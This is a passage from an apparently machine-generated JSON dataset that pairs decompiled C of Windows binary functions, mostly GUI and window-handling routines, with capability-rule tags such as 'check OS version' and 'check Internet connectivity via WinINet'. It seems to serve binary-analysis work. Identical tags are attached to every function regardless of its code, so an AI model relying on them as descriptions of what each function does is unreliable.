iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.00418470(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.004585f8(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 885
    },
    "0045c000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c000(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x45c291;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.00407550();\n        uStackY52 = 0x45c040;\n        fcn.00407550(&fcn.0045c000::var_4h);\n        fcn.00405818();\n        fcn.0040dafc();\n        fcn.00404ec4();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.00407550();\n        uStackY52 = 0x45c081;\n        fcn.00407550(&fcn.0045c000::var_ch);\n        fcn.00405818();\n        fcn.0040dafc();\n        fcn.00404ec4();\n    }\n    iVar3 = fcn.0045a500();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.0045aa94();\n                uVar4 = fcn.0045aa58();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00404650();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.0045c8e8();\n            }\n            else {\n                iVar1 = *(iVar3 + 8);\n                if (iVar1 == 0) {\n                    *(*(iVar3 + 0x14) + 8) = 0;\n                    fcn.00404650();\n                }\n                else {\n                    *(iVar1 + 0x18) = *(*(param_2 + 0x14) + 0x18);\n                    if (*(*(iVar3 + 8) + 0x18) == 0) {\n                        *(*(*(param_2 + 0x14) + 0x14) + 8) = iVar1;\n                    }\n                    else {\n                        *(*(*(iVar3 + 8) + 0x18) + 0xc) = iVar1;\n                    }\n                    iVar3 = *(iVar3 + 8);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                    iVar1 = *(iVar3 + 0xc);\n                    while (iVar1 != 0) {\n                        iVar3 = *(iVar3 + 0xc);\n                        *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                        iVar1 = *(iVar3 + 0xc);\n                    }\n                    *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                    if (*(iVar3 + 0xc) != 0) {\n                        *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                    }\n                    uStackY52 = 0x45c910;\n                    fcn.0045ae14();\n                    fcn.00404650();\n                    fcn.00404650();\n                }\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.0045a5b8();\n                fcn.0045aa80();\n                fcn.0045a8dc();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00404650();\n            }\n            uStackY52 = 0x45c910;\n            fcn.0045ae14();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.0045a8dc();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.0045aa58();\n            fcn.0045aa94();\n            fcn.0045a8dc();\n        }\n        uStackY52 = 0x45c910;\n        fcn.0045ae14();\n    }\n    fcn.00404650();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x45c298;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1460
    },
    "0045c444": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c444(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45c544;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (((in_EAX == *(*(arg_8h + -8) + 100)) || (*(in_EAX + 8) != 0)) ||\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 4) != 0)) {\n        (**(**(arg_8h + -4) + 0x10))();\n        (**(**(arg_8h + -4) + 0x10))();\n        if (*(*(arg_8h + -8) + 0x74) != '\\0') {\n            (**(**(arg_8h + -8) + 0x28))();\n            fcn.0045d084();\n        }\n        (**(**(arg_8h + -4) + 0x10))();\n        arg_8h_00 = arg_8h;\n        fcn.0045a7e4();\n        fcn.0045c3c8(arg_8h_00);\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045c444(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045c444(arg_8h);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45c54b;\n    uStack32 = 0x45c543;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 477
    },
    "0045c554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c554(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x45c6fb;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x45c588;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c59b;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c5b1;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c5bd;\n    piVar1 = fcn.00404620();\n    uStack56 = 0x45c674;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.00456fac();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00456fc0();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.0045c3c8(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x45c67b;\n    uStack56 = 0x45c673;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 594
    },
    "0045c8e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c8e8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.00456fac();\n        if (0 < iVar1) {\n            fcn.0045ae14(0x45c910);\n        }\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0045ca20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ca20(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.0045aa58();\n        iVar2 = fcn.0045aa58();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            iVar1 = *(arg_8h + -8);\n            iVar2 = fcn.0045aa58();\n            if (iVar1 < iVar2) {\n                iVar2 = iVar1;\n            }\n            *(arg_8h + -8) = iVar2;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045ca20(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045ca20(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "0045cbfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045cbfc(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.0045a514();\n        if (iVar2 == 1) {\n            fcn.0045cbfc(arg_8h);\n        }\n    }\n    iVar2 = fcn.0045a514();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.0045ab40();\n        if (iVar3 == 0) {\n            iVar3 = fcn.0045ab34();\n            if (iVar3 != 0) {\n                fcn.0045ab34();\n                iVar3 = fcn.0045aa58();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.0045a570();\n                    fcn.0045aa80();\n                    fcn.0045ab34();\n                    fcn.0045aad4();\n                }\n            }\n        }\n        else {\n            fcn.0045ab40();\n            iVar3 = fcn.0045aa58();\n            iVar4 = fcn.0045a570();\n            if ((iVar3 - iVar4) - *(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.0045aa58();\n                fcn.0045aa80();\n                fcn.0045aa58();\n                fcn.0045aa80();\n                fcn.0045ab40();\n                fcn.0045aad4();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.0045a73c();\n    }\n    fcn.0045ae14(0x45c910, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 564
    },
    "0045d128": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045d128(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t in_CL;\n    char in_DL;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (in_DL == '\\0') {\n        if ((in_CL & 0x40) == 0) {\n            fcn.00418420();\n            iVar2 = fcn.0045b590();\n            if (iVar2 != 0) {\n                if (var_8h == 0x12) {\n                    fcn.00418420();\n                    fcn.0045c80c();\n                }\n                else if (var_8h == 2) {\n                    uVar3 = fcn.004585f8(0x203, 0x203, 0);\n                    iVar4 = sub.user32.dll_PeekMessageA(&var_24h, uVar3);\n                    if (iVar4 == 0) {\n                        cVar1 = fcn.004047dc();\n                        if (cVar1 != '\\0') {\n                            (**(**(iVar2 + 4) + 0xd4))();\n                        }\n                    }\n                    if ((*(*(iVar2 + 4) + 0x8f) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                        fcn.00450fd0();\n                    }\n                    *arg_8h = 1;\n                }\n            }\n        }\n        else {\n            fcn.00418420();\n            iVar2 = fcn.0045b590();\n            if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_8h == 2)) {\n                fcn.0044edc0();\n                fcn.00451694(1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 476
    },
    "0045d2dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d2dc(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.0045c934();\n        fcn.00418420();\n        *(in_EAX + 0x50) = var_ch;\n        *(in_EAX + 0x54) = var_8h;\n        fcn.0045d24c(&stack0xfffffffc);\n        fcn.0045c934();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0045d32c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d32c(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char in_DL;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (in_DL == '\\0') {\n        if (*(in_EAX + 0x60) == 0) {\n            fcn.00418420();\n            iVar2 = fcn.0045b590();\n            if ((iVar2 != 0) && (var_4h == 0x14)) {\n                cVar1 = fcn.004047dc();\n                if (cVar1 == '\\0') {\n                    fcn.004507b4();\n                }\n                else {\n                    fcn.00442a04();\n                }\n            }\n        }\n        else {\n            fcn.0045c86c();\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0045d524": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d524(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x2c) != 0) && (*(in_EAX + 0x20) != '\\0')) {\n        fcn.0045d664();\n        uVar1 = (**(*(in_EAX + 0x2c) + 0x2c))();\n        *(in_EAX + 0x28) = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "0045d598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045d598(void)\n\n{\n    return *0x499ca0 != '\\0';\n}\n",
        "token_count": 25
    },
    "0045d614": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d614(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.004085d4(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 107
    },
    "0045d684": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d684(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.0045d5c8();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.0045d5e4();\n            return;\n        }\n        fcn.0045d614();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "0045d6e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d6e8(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x494d28 + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x45d706;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x45d84e;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x499cb8 == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x45d85c);\n            *0x499cb8 = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x45d864);\n        }\n        if (*0x49277c == 0) {\n            *0x49277c = sub.kernel32.dll_LoadLibraryA(0x45d874);\n            if (*0x49277c != 0) {\n                *0x499cbc = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d880);\n                *0x499cc0 = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d890);\n                *0x499cc4 = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d8a4);\n                *0x499cc8 = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d8bc);\n                *0x499ccc = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d8d4);\n                *0x499cd0 = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d8e8);\n                *0x499cd4 = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d900);\n                *0x499cd8 = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d918);\n                *0x499cdc = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d934);\n                *0x499ce0 = sub.kernel32.dll_GetProcAddress_1(*0x49277c, 0x45d940);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x45d855);\n        return;\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0045d950": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d950(void)\n\n{\n    uint uVar1;\n    \n    if (*0x499cb8 != NULL) {\n        uVar1 = (**0x499cb8)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0045d96c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d96c(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x494d28 + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x45d99b;\n            fcn.0045d950();\n        }\n        else {\n            uStack24 = 0x45d9a9;\n            fcn.0045d950();\n            if (*0x49277c != 0) {\n                puStack28 = 0x45d9bd;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x499cbc)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x45d9d4;\n                    uStack36 = uVar1;\n                    (**0x499cc4)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x499ccc)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x499ccc)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x499ccc)();\n                        (**0x499cc4)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x49277c);\n                    }\n                    (**0x499cc8)(uVar1, uStack44, uStack40);\n                    (**0x499cc0)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "0045da44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045da44(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49277c != 0) {\n        uVar1 = (**0x499cdc)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0045da58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045da58(void)\n\n{\n    fcn.00404650();\n    **0x494b0c = 0;\n    fcn.00404650();\n    **0x494cfc = 0;\n    fcn.00404650();\n    *0x499c5c = 0;\n    fcn.00404650();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x499c72);\n    fcn.00405530();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x499c70);\n    fcn.00405530();\n    if (*0x49277c != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x49277c);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0045ddc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ddc4(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar2 = *(in_EAX + 4);\n    if (iVar2 != 0) {\n        if (arg_8h != '\\0') {\n            *(iVar2 + 0x164) = 1;\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) | 0x4000;\n        }\n        uStack28 = 0x45de9f;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        cVar3 = fcn.004533f4();\n        if ((cVar3 == '\\0') || (*(*(in_EAX + 4) + 0x30) == 0)) {\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h);\n        }\n        else {\n            arg_ch = arg_ch - (*(in_EAX + 0xc) + *(in_EAX + 0x14));\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h - (*(in_EAX + 8) + *(in_EAX + 0x10)));\n        }\n        *in_FS_OFFSET = arg_ch;\n        if (arg_8h != '\\0') {\n            iVar2 = *(in_EAX + 4);\n            *(iVar2 + 0x164) = 0;\n            puVar1 = iVar2 + 0x54;\n            *puVar1 = *puVar1 & 0xbfff;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 457
    },
    "0045e538": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e538(int32_t arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x45e6c6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00406928(arg_1ch[2]);\n    iVar1 = fcn.00406774();\n    if (arg_1ch[3] < 1) {\n        if (-1 < iVar1) {\n            iVar2 = iVar1 + 1;\n            do {\n                fcn.00411a68();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    else if (-1 < iVar1) {\n        iVar2 = iVar1 + 1;\n        do {\n            fcn.00411a68();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (*(arg_8h + 4) != NULL) {\n        (**(**(arg_8h + 4) + 0x38))();\n    }\n    if (arg_1ch[3] < 1) {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a68();\n                }\n                iVar2 = iVar2 